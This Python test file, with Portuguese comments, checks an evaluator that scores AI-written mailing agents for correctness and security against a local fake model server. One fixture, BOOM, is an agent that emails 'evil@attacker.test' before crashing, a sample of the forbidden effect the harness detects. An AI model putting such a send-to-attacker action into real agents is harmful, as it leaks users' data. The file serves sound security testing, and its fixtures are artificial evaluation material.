"""M10: o avaliador (A1–A7) sobre uma árvore de autorias montada à mão, com um servidor local no
lugar do modelo real. Agentes de referência, um agente sem defesa, um que não compila, um que
executa o efeito proibido e quebra, e uma entrega vazia. Sem rede externa."""

import json
import os
import sys
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

HERE = Path(__file__).resolve().parents[1]
ROOT = HERE.parents[1]
sys.path.insert(0, str(HERE))
ATHC = os.environ.get("ATHC", str(ROOT / "target" / "release" / "athc"))
PACK = HERE / "packs" / "_example_mailing"


class FakeModel(BaseHTTPRequestHandler):
    """Um modelo cooperativo para o pacote de exemplo, nas duas formas de esquema."""

    def log_message(self, *a):
        pass

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        prompt = body["messages"][-1]["content"]
        schema = json.dumps(body["response_format"])
        ath = '"Plan"' in schema
        add, send = ("Add", "Send") if ath else ("add", "send")
        if "carol@example.org" in prompt:
            ops, answer = [{"kind": add, "email": "carol@example.org"}], "Added carol@example.org."
        elif "announcement" in prompt:
            ops = [{"kind": send, "to": t, "subject": "Meetup", "body": "The meetup is on Friday at 6pm."}
                   for t in ("ana@example.org", "bob@example.org")]
            answer = "Announcement sent."
        else:
            ops, answer = [], "Ana says: see you on Friday."
        value = {"ops": ops, "answer": answer}
        if ath:
            value["kind"] = "Plan"
        out = {"id": "x", "object": "chat.completion", "created": 0, "model": body["model"],
               "choices": [{"index": 0, "finish_reason": "stop",
                            "message": {"role": "assistant", "content": json.dumps({"value": value})}}],
               "usage": {"prompt_tokens": 500, "completion_tokens": 60, "total_tokens": 560}}
        data = json.dumps(out).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


BOOM = ("def run(request, tools, trusted, llm):\n"
        "    tools.call('send_email', to='evil@attacker.test', subject='s', body='b')\n"
        "    raise RuntimeError('boom')\n")


@unittest.skipUnless(Path(ATHC).is_file(), "requer o athc compilado")
class EvaluatorTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        import evaluate_all

        cls.server = HTTPServer(("127.0.0.1", 0), FakeModel)
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()
        os.environ["OPENAI_BASE_URL"] = f"http://127.0.0.1:{cls.server.server_address[1]}/v1"
        os.environ["OPENAI_API_KEY"] = "fake"
        cls.tmp = tempfile.TemporaryDirectory()
        root = Path(cls.tmp.name)
        good_ath, good_py = (PACK / "agent.ath").read_text(), (PACK / "agent.py").read_text()
        broken_ath = good_ath.replace("commit add_subscriber(mail, email)", "add_subscriber(mail, email)")
        tree = {("ath", 1): [broken_ath, good_ath], ("py", 1): [(PACK / "naive.py").read_text(), good_py],
                ("ath", 2): [good_ath], ("py", 2): [BOOM], ("ath", 3): [""], ("py", 3): [""]}
        for (lang, rep), versions in tree.items():
            d = root / "authoring" / "_example_mailing" / lang / f"rep{rep}"
            d.mkdir(parents=True)
            cycles = []
            for i, src in enumerate(versions, 1):
                (d / f"v{i}.{lang}").write_text(src)
                cycles.append({"cycle": i, "file": f"v{i}.{lang}", "tok_in": 1000, "tok_out": 400, "feedback": ""})
            (d / "result.json").write_text(json.dumps({
                "pack": "_example_mailing", "lang": lang, "rep": rep, "clean": src == versions[-1] and src not in ("", BOOM),
                "cycles": cycles, "tok_in": 1000 * len(cycles), "tok_out": 400 * len(cycles), "seconds": 1.0,
                "usd": 0.0004 * len(cycles)}))
        (root / "authoring" / "a7.json").write_text(json.dumps({"_example_mailing/ath/rep2": 4}))
        cls.root = root
        with tempfile.TemporaryDirectory() as cache:
            os.environ["M10_EMIT_CACHE"] = cache
            cls.s = evaluate_all.evaluate(root / "authoring", HERE / "packs", root / "eval", 8, True, 8)
        cls.rows = {(r["lang"], r["rep"]): r for r in json.loads((root / "eval" / "rows.json").read_text())}

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.tmp.cleanup()
        for k in ("M10_EMIT_CACHE", "OPENAI_BASE_URL", "OPENAI_API_KEY"):
            os.environ.pop(k, None)

    def test_reference_agents_are_correct_and_secure(self):
        for key in (("ath", 1), ("py", 1), ("ath", 2)):
            f = self.rows[key]["final"]
            self.assertTrue(f["correct_and_secure"], (key, f, self.rows[key]["detail"]["final"]["legit"]))
            self.assertEqual((f["violated"], f["violated_malformed"], f["legit_passed"]), (0, 0, 3), key)
        self.assertTrue(self.rows[("ath", 2)]["A1"])

    def test_a_program_that_does_not_compile_is_not_a_first_version(self):
        r = self.rows[("ath", 1)]
        self.assertFalse(r["A1"])
        self.assertFalse(r["first"]["runnable"])
        self.assertFalse(r["first"]["secure"])
        self.assertEqual(r["first"]["legit_passed"], 0)
        self.assertEqual(r["A2"], {"cycles": 2, "tools_clean": True, "final_passes": True})

    def test_a_vulnerable_agent_is_useful_but_violated(self):
        r = self.rows[("py", 1)]
        self.assertEqual(r["first"]["legit_passed"], 3)
        self.assertEqual(r["first"]["violated"], 3)
        self.assertFalse(r["A1"])

    def test_forbidden_effect_counts_even_when_the_agent_crashes_afterwards(self):
        r = self.rows[("py", 2)]
        self.assertEqual(r["final"]["violated"], 3)
        self.assertEqual(r["final"]["violated_malformed"], 3)
        self.assertEqual(r["final"]["legit_passed"], 0)
        self.assertFalse(r["A1"])

    def test_an_empty_delivery_is_neither_secure_nor_useful(self):
        for lang in ("ath", "py"):
            r = self.rows[(lang, 3)]
            self.assertFalse(r["first"]["secure"])
            self.assertFalse(r["A1"])
            self.assertEqual(r["A6"], 0)

    def test_aggregate_paired_and_decision(self):
        s = self.s
        self.assertEqual((s["authorings"], s["pairs"]), (6, 3))
        self.assertEqual(s["langs"]["ath"]["A1_first_correct_and_secure"], 1)
        self.assertEqual(s["langs"]["py"]["A1_first_correct_and_secure"], 0)
        self.assertEqual(s["paired"]["A1"], {"only_ath": 1, "only_py": 0, "p": 1.0})
        self.assertEqual(s["langs"]["py"]["A3_violated_scenarios"], 3)   # só o agente que quebra (final)
        self.assertEqual(s["langs"]["ath"]["A3_violated_scenarios"], 0)
        self.assertEqual(s["langs"]["ath"]["nonconforming"] + s["langs"]["py"]["nonconforming"], 0)
        self.assertEqual(s["langs"]["ath"]["A7_mean"], 4)
        self.assertEqual(s["decision"]["verdict"], "não superior")  # A1 maior, mas sem significância
        self.assertIn("amostragem, não", (self.root / "eval" / "report.md").read_text())

    def test_quota_or_spend_cap_is_never_recorded_as_a_failed_scenario(self):
        import evaluate_all
        import harness

        real = harness.exec_subprocess
        for error in ("RtErr R0621: provedor: HTTP 429 depois de 6 tentativas", "RateLimitError: Error code: 429 - TPD"):
            def fake(lang, agent, pack_dir, sid, mode, seed, error=error):
                if mode != "real":
                    return real(lang, agent, pack_dir, sid, mode, seed)
                kind = "legit"
                return {"scenario": sid, "kind": kind, "mode": mode, "seed": seed, "error": error, "calls": [],
                        "passed": False, "usage": {"calls": 1, "tok_in": 0, "tok_out": 0}}

            harness.exec_subprocess = fake
            try:
                with tempfile.TemporaryDirectory() as d:
                    ev = evaluate_all.Evaluator(HERE / "packs", Path(d), 2, True, 4)
                    with self.assertRaises(evaluate_all.QuotaExhausted):
                        ev.version("py", PACK / "agent.py", "_example_mailing")
                    self.assertEqual(ev.cache, {}, "uma versão interrompida pela cota não pode ficar em cache")
                    capped = evaluate_all.Evaluator(HERE / "packs", Path(d), 2, True, 4, max_usd=0.0)
                    with self.assertRaises(evaluate_all.QuotaExhausted):
                        capped.version("py", PACK / "agent.py", "_example_mailing")
            finally:
                harness.exec_subprocess = real

    def test_sloc_ignores_comments_and_docstrings(self):
        import evaluate_all

        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "a.py"
            p.write_text('"""doc"""\n# c\n\ndef f():\n    """d"""\n    return 1  # x\n')
            self.assertEqual(evaluate_all.sloc(p, "py"), 2)
            a = Path(d) / "a.ath"
            a.write_text("-- c\nmodule m\n\n  -- d\ntype T = | A\n")
            self.assertEqual(evaluate_all.sloc(a, "ath"), 2)

    def test_statistics(self):
        import evaluate_all

        self.assertEqual(evaluate_all.mcnemar_exact(0, 0), 1.0)
        self.assertAlmostEqual(evaluate_all.mcnemar_exact(10, 0), 2 / 1024)
        lo, hi = evaluate_all.wilson(0, 30)
        self.assertEqual(lo, 0.0)
        self.assertAlmostEqual(hi, 0.1135, places=3)


if __name__ == "__main__":
    unittest.main()
